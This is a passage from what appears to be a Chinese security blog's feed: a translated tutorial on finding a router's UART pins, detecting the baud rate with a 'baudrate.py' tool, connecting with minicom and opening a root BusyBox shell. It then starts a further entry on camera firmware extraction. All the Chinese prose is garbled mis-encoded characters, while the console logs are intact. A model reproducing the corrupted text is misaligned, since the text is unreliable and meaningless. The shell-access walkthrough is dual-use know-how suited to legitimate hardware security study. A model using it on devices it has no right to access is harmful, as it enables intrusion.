¸ã€ç³»ç»Ÿçš„æ‰€æœ‰å¼•å¯¼ä¿¡æ¯æ‰“å°åˆ°ä¸²å£æ—¶ã€‚é€šè¿‡åœ¨å¼•å¯¼æœŸé—´ç›‘æ§å¼•è„š2å’Œ4ï¼Œæˆ‘ä»¬åº”è¯¥å¯ä»¥è½»æ¾åœ°è¯†åˆ«å“ªä¸ªæ˜¯ä¼ è¾“å¼•è„šã€‚è®©æˆ‘ä»¬å…ˆçœ‹çœ‹P1402ï¼š</p><img src="/2019/03/02/serial-ports-translation-cn/11.jpg" title="P1402å¼•è„š2çš„ç”µå‹æµ‹é‡"><img src="/2019/03/02/serial-ports-translation-cn/12.jpg" title="P1402å¼•è„š4çš„ç”µå‹æµ‹é‡"><p>P1402å¼•è„š2å’Œ4çš„ç”µå‹éƒ½æ˜¯ç¨³å®šæ— æ³¢åŠ¨çš„3.3Vã€‚</p><img src="/2019/03/02/serial-ports-translation-cn/13.jpg" title="P1402å¼•è„š2å’Œ4çš„ç”µå‹"><p>è¿™å¯ä¸å¤ªå¥½ï¼Œæ‰€ä»¥è®©æˆ‘ä»¬çœ‹çœ‹P1404å¤´éƒ¨ï¼Œå°†ä»å¼•è„š2å¼€å§‹ï¼š</p><img src="/2019/03/02/serial-ports-translation-cn/14.jpg" title="P1404å¼•è„š2çš„ç”µå‹æµ‹è¯•"><p>å¼•è„š2çš„ç”µå‹æ•°å€¼åœ¨æœ€åˆçš„å‡ ç§’å¾˜å¾Šåœ¨40mVï¼Œç„¶åå®ƒç¨³å®šåœ¨2.3Vï¼š</p><img src="/2019/03/02/serial-ports-translation-cn/15.jpg" title="P1404å¼•è„š2çš„åˆå§‹ç”µå‹"><img src="/2019/03/02/serial-ports-translation-cn/16.jpg" title="P1404å¼•è„š2çš„æœ€ç»ˆç”µå‹"><p>è®©æˆ‘ä»¬çœ‹çœ‹å¼•è„š4ï¼š</p><img src="/2019/03/02/serial-ports-translation-cn/17.jpg" title="P1404å¼•è„š4çš„ç”µå‹æµ‹è¯•"><p>å¼•è„š4çš„ç”µå‹æ•°å€¼åœ¨æœ€åˆå‡ ç§’ç¨³å®šåœ¨3.3Vï¼š</p><img src="/2019/03/02/serial-ports-translation-cn/18.jpg" title="P1404å¼•è„š4çš„åˆå§‹ç”µå‹"><p>ç„¶åçªç„¶æˆ‘ä»¬å¼€å§‹çœ‹åˆ°å¼•è„š4çš„ç”µå‹æ•°å€¼å¿«é€Ÿå¹¶å®è´¨çš„å˜åŒ–ï¼š</p><img src="/2019/03/02/serial-ports-translation-cn/19.jpg" title="P1404å¼•è„š4çš„ç”µå‹ä¸‹é™åˆ°2.4V"><img src="/2019/03/02/serial-ports-translation-cn/20.jpg" title="P1404å¼•è„š4çš„ç”µå‹å›å‡åˆ°3.2V"><img src="/2019/03/02/serial-ports-translation-cn/21.jpg" title="P1404å¼•è„š4çš„ç”µå‹ä¸‹é™åˆ°2.3V"><p>P1404çš„å¼•è„š4å­˜åœ¨ä¸€äº›æ´»åŠ¨ï¼Œè¡¨æ˜å®ƒå®é™…ä¸Šæ˜¯ä¸€ä¸ªæœ‰æ•ˆæ•°æ®å¼•è„šï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯ä¸²å£çš„ä¼ è¾“å¼•è„šã€‚</p><p>è™½ç„¶è¿™æ˜¯è¯†åˆ«ä¼ è¾“å¼•è„šçš„æœ‰æ•ˆæ–¹æ³•ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä¸²å£ä»…ä»…ä¼ è¾“å°‘é‡æ•°æ®ï¼Œç”µå‹æ³¢åŠ¨å¯¹äºä¸‡ç”¨è¡¨æ¥è¯´å¤ªè¿‡çŸ­æš‚ï¼Œä½ å°±è¦ä½¿ç”¨ç¤ºæ³¢å™¨æˆ–é€»è¾‘åˆ†æä»ªæ¥æ•è·ä¼ è¾“å¼•è„šä¸Šä¸Šçš„æ•°æ®æ´»åŠ¨ã€‚ç„¶è€Œè¿™æ˜¯å¾ˆå°‘è§çš„ï¼Œé€šå¸¸ä¸²å£ä¸Šéƒ½ä¼šæœ‰å¤§é‡æ•°æ®ä¼ è¾“æ¥è®©è¿™ä¸ªæ–¹æ³•èµ·ä½œç”¨ã€‚</p><h2 id="è¯†åˆ«æ¥å—å¼•è„š"><a href="#è¯†åˆ«æ¥å—å¼•è„š" class="headerlink" title="è¯†åˆ«æ¥å—å¼•è„š"></a>è¯†åˆ«æ¥å—å¼•è„š</h2><p>æ˜ç¡®è¯†åˆ«æ¥å—å¼•è„šæ˜¯æœ€å›°éš¾çš„ï¼Œå› ä¸ºå®ƒæ²¡æœ‰ç‹¬ç‰¹çš„å®šä¹‰ç‰¹å¾ã€‚æˆ‘è§‚å¯Ÿè¿‡å„ç§ç³»ç»Ÿçš„æ¥å—å¼•è„šçš„å„ç§ç”µå‹ï¼ŒåŒ…æ‹¬ï¼š</p><ul><li>æ‹‰é«˜åˆ°å’ŒVccç›¸åŒçš„ç”µå‹</li><li>æ‹‰é«˜åˆ°æ¯”Vccä½å‡ ç™¾mVçš„ç”µå‹</li><li>å·¦æ¼‚æµ®ï¼Œåœ¨å‡ ç™¾mVå·¦å³å‰§çƒˆæ³¢åŠ¨</li><li>å·¦æ¼‚æµ®å‡ ç§’ï¼Œç„¶ååœ¨ä¸²å£åˆå§‹åŒ–æ—¶è¢«æ‹‰é«˜</li></ul><p>ç”±äºæˆ‘ä»¬åœ¨ä¸¤ä¸ªå¤´éƒ¨ä¸Šåªå‰©ä¸‹ä¸€ä¸ªæœªçŸ¥å¼•è„šï¼Œæˆ‘ä»¬çŸ¥é“åªæœ‰P1404æœ‰æ•ˆï¼Œé€šè¿‡æ’é™¤æ³•æˆ‘ä»¬å¯ä»¥å‡è®¾P1404ä¸Šçš„å¼•è„š4æ˜¯æ¥å—å¼•è„šã€‚ä½†æ˜¯ï¼Œæœ‰æ—¶å¯ä»¥å°†ä¸²è¡Œé€‚é…å™¨å•ç‹¬è¿æ¥åˆ°æ‰€æœ‰å¯èƒ½çš„æ¥å—å¼•è„šï¼Œè¿è¡Œminicomï¼ˆLinuxä¸‹çš„ä¸²å£è¿æ¥ç¨‹åºï¼‰æŒ‰é”®ç›˜çš„å‡ ä¸ªé”®ï¼Œçœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆã€‚è¯´åˆ°è¿æ¥æˆ‘ä»¬çš„ä¸²è¡Œé€‚é…å™¨ï¼Œè®©æˆ‘ä»¬è¿™æ ·åšã€‚</p><h2 id="è¿æ¥UARTé€‚é…å™¨"><a href="#è¿æ¥UARTé€‚é…å™¨" class="headerlink" title="è¿æ¥UARTé€‚é…å™¨"></a>è¿æ¥UARTé€‚é…å™¨</h2><p>ä¾¿å®œçš„USB-UARTé€‚é…å™¨å¾ˆå®¹æ˜“è·å¾—ï¼Œå¹¶ä¸”åœ¨Linuxä¸Šé»˜è®¤æ”¯æŒï¼Œå®ƒä»¬åªæ˜¯ä½œä¸ºæ ‡å‡†çš„USBä¸²å£ï¼Œå¯ä»¥å’Œminicomã€pythonç­‰ä¸€èµ·ä½¿ç”¨ã€‚æˆ‘ä»¬éœ€è¦å°†UARTé€‚é…å™¨è¿æ¥åˆ°ä¸²å£ï¼Œæ–¹å¼å¦‚ä¸‹ï¼š</p><ul><li>é€‚é…å™¨çš„åœ°çº¿å¿…é¡»è¿æ¥åˆ°ä¸²å£çš„åœ°çº¿</li><li>é€‚é…å™¨çš„ä¼ è¾“å¼•è„šå¿…é¡»è¿æ¥åˆ°ä¸²å£çš„æ¥å—å¼•è„š</li><li>é€‚é…å™¨çš„æ¥å—å¼•è„šå¿…é¡»è¿æ¥åˆ°ä¸²å£çš„ä¼ è¾“å¼•è„š</li></ul><p>å®ç°è¿™ä¸ªçš„æœ€ç®€å•æ–¹æ³•æ˜¯å°†<a href="http://www.digikey.com/product-detail/en/4-103327-0/A26514-40-ND/297924" target="_blank" rel="noopener">åˆ†ç¦»å¤´</a>æŒ‰å¤§å°ç„Šæ¥åœ¨P1404ï¼š</p><img src="/2019/03/02/serial-ports-translation-cn/22.jpg" title="åˆ†ç¦»å¤´å›ºå®šåœ¨é¢æ¿ä¸Š"><p>å¹¶ä½¿ç”¨ä¸€äº›<a href="https://www.sparkfun.com/products/9140" target="_blank" rel="noopener">å…¬å¯¹æ¯è·³çº¿</a>è¿æ¥ä¸²å£å’Œé€‚é…å™¨ä¹‹é—´çš„ç›¸åº”å¼•è„šï¼š</p><img src="/2019/03/02/serial-ports-translation-cn/23.jpg" title="UARTé€‚é…å™¨è¿æ¥P1404"><h2 id="å‘ç°æ³¢ç‰¹ç‡"><a href="#å‘ç°æ³¢ç‰¹ç‡" class="headerlink" title="å‘ç°æ³¢ç‰¹ç‡"></a>å‘ç°æ³¢ç‰¹ç‡</h2><p>æœ‰äº†æˆ‘ä»¬çš„ç¡¬ä»¶ï¼Œå°±å¯ä»¥å¼€å§‹æ£€æŸ¥ä¸²å£åè®®è®¾ç½®äº†ã€‚ä¸²å£å¯ä»¥æœ‰å¤šç§è®¾ç½®ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“æ‰€æœ‰è®¾ç½®æ‰èƒ½å’Œä¸²å£é€šä¿¡ï¼š</p><ul><li>ä»€ä¹ˆæ˜¯æ³¢ç‰¹ç‡ï¼Ÿ</li><li>ä½¿ç”¨äº†å¤šå°‘æ•°æ®ä½ï¼Ÿ</li><li>ä½¿ç”¨äº†å¤šå°‘å¥‡å¶æ ¡éªŒä½ï¼Ÿ</li><li>ä½¿ç”¨äº†å¤šå°‘åœæ­¢ä½ï¼Ÿ</li></ul><p>å¹¸è¿çš„æ˜¯ï¼Œäº‹å®ä¸Šçš„æ ‡å‡†æ˜¯ä½¿ç”¨8ä¸ªæ•°æ®ä½ï¼Œæ²¡æœ‰å¥‡å¶æ ¡éªŒä½å’Œ1ä¸ªåœæ­¢ä½ï¼ˆç¼©å†™æˆ8N1ï¼‰ï¼Œæ‰€ä»¥åªç•™ä¸‹æ³¢ç‰¹ç‡æ˜¯æœªçŸ¥çš„ã€‚è¯•é”™æ³•æ˜¯è¯†åˆ«æ³¢ç‰¹ç‡çš„æœ€å¿«ã€æœ€ç®€å•çš„æ–¹æ³•ã€‚ç”±äºä¸²å£é€šå¸¸ç”¨äºæ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯ï¼ˆå³ä¼ è¾“ASCIIæ•°æ®ï¼‰ï¼Œå¹¶ä¸”åªæœ‰å°‘é‡å¯èƒ½çš„æ³¢ç‰¹ç‡ï¼Œå› æ­¤åˆ‡æ¢æ‰€æœ‰å¯èƒ½çš„æ³¢ç‰¹ç‡ç›´åˆ°è§‚å¯Ÿåˆ°å¯ä»¥ç†è§£çš„æ•°æ®æ˜¯åˆ‡å®å¯è¡Œçš„ã€‚</p><p>æˆ–è€…ï¼Œè‡³å°‘è¿™æ˜¯ç†è®ºä¸Šçš„å·¥ä½œæ–¹å¼ã€‚å®é™…ä¸Šï¼Œå¦‚æœæ”¯æŒè¿™æ ·åšçš„è¯ï¼Œæˆ‘ä½¿ç”¨çš„æ‰€æœ‰ç»ˆç«¯ä»¿çœŸç¨‹åºéƒ½ä¼šä½¿å¾—åŠ¨æ€æ›´æ”¹æ³¢ç‰¹ç‡å˜å¾—å¾ˆéº»çƒ¦ã€‚ä¸ºäº†å»è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘å†™äº†ä¸€ä¸ªåä¸ºbaudrateçš„å·¥å…·ï¼Œå®ƒè¯•å›¾è‡ªåŠ¨æ£€æµ‹æ¿€æ´»çš„ä¼ è¾“ä¸²å£æ³¢ç‰¹ç‡ï¼ˆå¦‚æœä½ æ„¿æ„ï¼Œä½ ä¹Ÿå¯ä»¥æ‰‹åŠ¨å¾ªç¯æ¯ä¸ªæ³¢ç‰¹ç‡ï¼‰ã€‚å®Œæˆåï¼Œå®ƒä¼šä¿å­˜ä¸€ä¸ªä¸minicomå…¼å®¹çš„é…ç½®æ–‡ä»¶ï¼Œå¹¶èƒ½ç”¨ä½ çš„minicomåŠ è½½ã€‚</p><p>éšç€UARTé€‚é…å™¨çš„è¿æ¥ï¼Œè®©æˆ‘ä»¬è¿è¡Œbaudrateï¼ˆæˆ‘ä½¿ç”¨æ‰‹åŠ¨æ¨¡å¼æ¼”ç¤ºï¼Œä½†è‡ªåŠ¨æ£€æµ‹åŠŸèƒ½åœ¨ä¸€æ ·æœ‰é­…åŠ›ï¼‰ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">eve@eve:~$ sudo ./baudrate.py -p /dev/ttyUSB0</span><br><span class="line"></span><br><span class="line">Starting baudrate detection on /dev/ttyUSB0, turn on your serial device now.</span><br><span class="line">Press Ctl+C to quit.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@ Baudrate: 115200 @@@@@@@@@@@@@@@@@@@@@</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬èƒ½æ”¹å˜æ³¢ç‰¹ç‡é€šè¿‡æŒ‰ä¸Š/ä¸‹ç®­å¤´å°†æ³¢ç‰¹ç‡æ”¹ä¸ºä¸‹ä¸€ä¸ªæ›´é«˜/æ›´ä½çš„æ³¢ç‰¹ç‡ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@@@@@@@@@@@@@@@@@@@@@ Baudrate: 115200 @@@@@@@@@@@@@@@@@@@@@</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@ Baudrate: 57600 @@@@@@@@@@@@@@@@@@@@@    &lt;--- Down arrow decreases baud rate</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@ Baudrate: 115200 @@@@@@@@@@@@@@@@@@@@@    &lt;--- Up arrow increases baud rate</span><br></pre></td></tr></table></figure><p>å¥½çš„ï¼Œç°åœ¨è®©æˆ‘ä»¬æ‰“å¼€ 9100EM ç„¶åçœ‹çœ‹ä¼šå‘ç”Ÿä»€ä¹ˆï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">@@@@@@@@@@@@@@@@@@@@@ Baudrate: 115200 @@@@@@@@@@@@@@@@@@@@@</span><br><span class="line"></span><br><span class="line">Starting entry for CP1 @0xa3400000</span><br><span class="line">memsize=52</span><br><span class="line">CPU revision is: 00019641</span><br><span class="line">Primary instruction cache 16kB, physically tagged, 4-way, linesize 32 bytes.</span><br><span class="line">Primary data cache 16kB 4-way, linesize 32 bytes.</span><br><span class="line">Linux version 2.4.21openrg-rmk1 #2 Thu Aug 28 19:30:48 CDT 2008</span><br><span class="line">Determined physical RAM map:</span><br><span class="line">User-defined physical RAM map:</span><br><span class="line"> memory: 03400000 @ 00000000 (usable)</span><br><span class="line">On node 0 totalpages: 13312</span><br><span class="line">zone(0): 4096 pages.</span><br><span class="line">zone(1): 9216 pages.</span><br><span class="line">zone(2): 0 pages.</span><br><span class="line">Kernel command line:  mem=52M</span><br><span class="line">mips_counter_frequency:166666667</span><br><span class="line">r4k_offset: 00196e6a(1666666)</span><br><span class="line">Calibrating delay loop... 222.00 BogoMIPS</span><br><span class="line">Memory: 44356k/53248k available (1568k kernel code, 8892k reserved, 6696k data, 4k init, 0k highmem)</span><br><span class="line">Dentry cache hash table entries: 8192 (order: 4, 65536 bytes)</span><br><span class="line">Inode cache hash table entries: 4096 (order: 3, 32768 bytes)</span><br><span class="line">Mount cache hash table entries: 512 (order: 0, 4096 bytes)</span><br><span class="line">Buffer-cache hash table entries: 1024 (order: 0, 4096 bytes)</span><br><span class="line">Page-cache hash table entries: 16384 (order: 4, 65536 bytes)</span><br><span class="line">Checking for &apos;wait&apos; instruction...  unavailable.</span><br><span class="line">POSIX conformance testing by UNIFIX</span><br><span class="line">PCI: Probing PCI hardware on host bus 0.</span><br><span class="line">Autoconfig PCI channel 0x801d19e0</span><br><span class="line">Scanning bus 00, I/O 0x1ae00000:0x1b000001, Mem 0x18000000:0x1a000001</span><br><span class="line">00:0e.0 Class 0200: 168c:001a (rev 01)</span><br><span class="line">        Mem at 0x18000000 [size=0x10000]</span><br><span class="line">Linux NET4.0 for Linux 2.4</span><br><span class="line">Based upon Swansea University Computer Society NET3.039</span><br><span class="line">Initializing RT netlink socket</span><br><span class="line">Starting kswapd</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>çœ‹èµ·æ¥æˆ‘ä»¬å°è¯•çš„ç¬¬ä¸€ä¸ªæ³¢ç‰¹ç‡115200æ˜¯æ­£ç¡®çš„ï¼ˆè¿™å¹¶ä¸å¥‡æ€ªï¼Œå› ä¸º115200æ˜¯å®è·µä¸­æœ€å¸¸è§çš„æ³¢ç‰¹ç‡ä¹‹ä¸€ï¼‰ã€‚æŒ‰Ctl + Cæˆ‘ä»¬å¯ä»¥åœæ­¢æ•è·å¹¶å°†è®¾ç½®ä¿å­˜åˆ°minicomé…ç½®æ–‡ä»¶ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æˆ‘å°†å…¶å‘½åä¸ºâ€™9100emâ€™ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Detected baudrate: 115200</span><br><span class="line"></span><br><span class="line">Save minicom configuration as: 9100em</span><br><span class="line"> </span><br><span class="line">Configuration saved. Run minicom now [n/Y]? n</span><br><span class="line"></span><br><span class="line">eve@eve:~$</span><br></pre></td></tr></table></figure><h2 id="è¿›å…¥shell"><a href="#è¿›å…¥shell" class="headerlink" title="è¿›å…¥shell"></a>è¿›å…¥shell</h2><p>ç°åœ¨æˆ‘ä»¬è¿è¡Œminicomï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eve@eve:~$ minicom 9100em</span><br></pre></td></tr></table></figure><p>ç„¶åçœ‹çœ‹æˆ‘ä»¬å¾—åˆ°äº†ä»€ä¹ˆï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">12/31 19:00:57 - Starting SoC reset sequence...</span><br><span class="line">12/31 19:00:58 - Clink FS shared data area written</span><br><span class="line">12/31 19:00:58 - CLNK_ETH_CTRL_RESET returned status 0 after 0.914 seconds</span><br><span class="line">12/31 19:00:58 - FSUPDATE: Pass = 1, Tuned Freq = 1000 MHz (8)</span><br><span class="line">12/31 19:01:10 - Clink Reset Cause :0x4 Reg:0x80240100 Dbg:0x0</span><br><span class="line">12/31 19:01:10 - Starting SoC reset sequence...</span><br><span class="line">12/31 19:01:11 - Clink FS shared data area written</span><br><span class="line">12/31 19:01:11 - CLNK_ETH_CTRL_RESET returned status 0 after 0.903 seconds</span><br><span class="line">12/31 19:01:12 - FSUPDATE: Pass = 1, Tuned Freq = 1150 MHz (14)</span><br><span class="line"></span><br><span class="line">Username: admin</span><br><span class="line">Password: *********</span><br><span class="line"></span><br><span class="line">Wireless Broadband Router&gt; help</span><br><span class="line">Error: help should be called with at least 1 argument</span><br><span class="line">help   Show help for commands within this menu</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">        help all - show all available commands in the current level</span><br><span class="line">        help [category]... category - show commands in a certain category</span><br><span class="line">        help [category]... command - show detailed help for a specific command</span><br><span class="line">        help -s string - search for categories/commands containing the string</span><br><span class="line"></span><br><span class="line">Availble help Categories</span><br><span class="line">help upnp - show help about UPnP commands</span><br><span class="line">help conf - show help about Read and write Wireless Broadband Router configuration data</span><br><span class="line">help option_manager - show help about Option Manager</span><br><span class="line">help fireball - show help about Fireball configuration and control</span><br><span class="line">help cwmp - show help about CWMP related commands</span><br><span class="line">help bridge - show help about API for managing ethernet bridge</span><br><span class="line">help firewall - show help about Control and display Firewall and NAT data</span><br><span class="line">help connection - show help about API for managing connections</span><br><span class="line">help inet_connection - show help about API for managing internet connections</span><br><span class="line">help misc - show help about API for Wireless Broadband Router miscellaneous tasks</span><br><span class="line">help firmware_update - show help about Firmware update commands</span><br><span class="line">help log - show help about Contorols Wireless Broadband Router logging behaviour</span><br><span class="line">help dev - show help about Device related commands</span><br><span class="line">help kernel - show help about Kernel related commands</span><br><span class="line">help system - show help about Commands to control Wireless Broadband Router execution</span><br><span class="line">help flash - show help about Flash and loader related commands</span><br><span class="line">help net - show help about Network related commands</span><br><span class="line">help cmd - show help about Commands related to the Command module</span><br><span class="line"></span><br><span class="line">Returned -1</span><br><span class="line">Wireless Broadband Router&gt; help system</span><br><span class="line"></span><br><span class="line">Command Category system - Commands to control Wireless Broadband Router execution</span><br><span class="line">die               Exit from Wireless Broadband Router and return ret</span><br><span class="line">ps                Print Wireless Broadband Router&apos;s tasks</span><br><span class="line">entity_close      Close an entity</span><br><span class="line">etask_list_dump   Dump back trace of all etasks</span><br><span class="line">restore_default   Restore default configuration</span><br><span class="line">reboot            Reboot the system</span><br><span class="line">ver               Display version information</span><br><span class="line">print_config      Print compilation configuration. Search for option if specified</span><br><span class="line">exec              Execute program</span><br><span class="line">cat               Print file contents to console</span><br><span class="line">shell             Spawn busybox shell in foreground</span><br><span class="line">date              Print the current UTC and local time</span><br><span class="line">exit              Exit sub menu</span><br><span class="line">help              Show help for commands within this menu</span><br><span class="line"></span><br><span class="line">Returned 0</span><br><span class="line">Wireless Broadband Router&gt;</span><br></pre></td></tr></table></figure><p>ä¸€äº›ä¸²å£è¦æ±‚ç™»å½•ï¼Œå¦å¤–æœ‰ä¸€äº›ä¸è¦æ±‚ã€‚åœ¨è¿™ä¸ªæ¡ˆä¾‹ä¸­ï¼Œç™»å½•åªæ˜¯è®¾å¤‡çš„ç®¡ç†å‘˜ç”¨æˆ·åå’Œå¯†ç ï¼Œå®ƒå°†æˆ‘ä»¬å¸¦å…¥ä¸€ä¸ªè‡ªå®šä¹‰å‘½ä»¤è¡Œshellï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å®ƒæ¥ç®¡ç†è·¯ç”±å™¨ã€‚æ ¹æ®helpçš„è¾“å‡ºï¼Œsystem shellå‘½ä»¤åº”è¯¥æä¾›ä¸€ä¸ªrootæƒé™çš„shellï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Wireless Broadband Router&gt; system shell</span><br><span class="line"></span><br><span class="line">BusyBox v1.01 (2005.09.07-07:38+0000) Built-in shell (lash)</span><br><span class="line">Enter &apos;help&apos; for a list of built-in commands.</span><br><span class="line"></span><br><span class="line">/ # cat /proc/cpuinfo</span><br><span class="line">system type             : TWINPASS-E</span><br><span class="line">processor               : 0</span><br><span class="line">cpu model               : unknown V4.1</span><br><span class="line">BogoMIPS                : 222.00</span><br><span class="line">wait instruction        : no</span><br><span class="line">microsecond timers      : yes</span><br><span class="line">tlb_entries             : 16</span><br><span class="line">extra interrupt vector  : yes</span><br><span class="line">hardware watchpoint     : yes</span><br><span class="line">VCED exceptions         : not available</span><br><span class="line">VCEI exceptions         : not available</span><br><span class="line">/ #</span><br></pre></td></tr></table></figure><h2 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h2><p>è¿™å°±æ˜¯ä½¿ç”¨ä¸€ä¸ªä¸‡ç”¨è¡¨å’Œä¸€äº›å…è´¹è½¯ä»¶ä»é€»è¾‘ä¸Šè¯†åˆ«äº†ä¸²å£çš„ç‰©ç†æ¥å£ï¼Œå‘ç°äº†å®ƒçš„æ³¢ç‰¹ç‡å¹¶è·å¾—ä¸€ä¸ªshellï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å®ƒæ¥è¿›ä¸€æ­¥æ¢ç´¢ç³»ç»Ÿã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;è¿™æ˜¯ä¸€ç¯‡æ¥è‡ªdevttys0çš„ä¸€ç¯‡æ–‡ç« ï¼Œåœ¨å¯»æ‰¾ä¸²å£çš„æ–¹æ³•ä¸Šç»™å‡ºäº†å¾ˆå¤šæœ‰ç”¨çš„æ–¹æ³•ï¼Œæ˜¯ä¸€ç¯‡ä¸é”™çš„æ€»ç»“æ–‡ï¼Œåœ¨å›½å†…æ²¡æœ‰çœ‹åˆ°ç¿»è¯‘ï¼Œæ‰€ä»¥å°±æƒ³ç¿»è¯‘æˆä¸­æ–‡ä¾›å¤§å®¶å­¦ä¹ ï¼Œç¬¬ä¸€æ¬¡åšç¿»è¯‘ï¼Œå¦‚æœ‰é”™è¯¯ä¹‹å¤„ï¼Œè¯·å¤§å®¶ä½“è°…ï¼Œå¯ä»¥ç»™æˆ‘ç•™è¨€ï¼Œæˆ‘ä¼šå¿«é€Ÿä¿®æ”¹ã€‚&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="IOT" scheme="https://hurricane618.me/tags/IOT/"/>
    
      <category term="ç¿»è¯‘" scheme="https://hurricane618.me/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>è¤çŸ³æŸæ‘„åƒå¤´çš„å®‰å…¨åˆ†æ--å›ºä»¶æå–</title>
    <link href="https://hurricane618.me/2019/02/18/yingshi-camera-firmware-extract/"/>
    <id>https://hurricane618.me/2019/02/18/yingshi-camera-firmware-extract/</id>
    <published>2019-02-18T15:35:08.000Z</published>
    <updated>2019-03-02T11:34:46.000Z</updated>
    
